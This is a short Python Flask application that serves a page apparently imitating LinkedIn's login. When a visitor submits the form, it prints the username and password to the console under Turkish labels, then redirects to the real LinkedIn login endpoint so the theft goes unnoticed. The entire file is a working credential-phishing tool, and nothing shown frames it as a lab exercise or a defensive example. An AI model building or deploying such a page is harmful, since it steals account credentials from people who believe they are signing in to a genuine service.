from flask import Flask, render_template, request, redirect

app = Flask(__name__)


@app.route('/')
def index():
    return render_template('linkedin.html')


@app.route('/login', methods=['POST'])
def login():
    print("Kullanıcı Adı : " + request.form["UsernameForm"] + " Şifre : " + request.form["PasswordForm"])
    return redirect("https://www.linkedin.com/uas/login-submit", code=302)


if __name__ == '__main__':
    app.run()
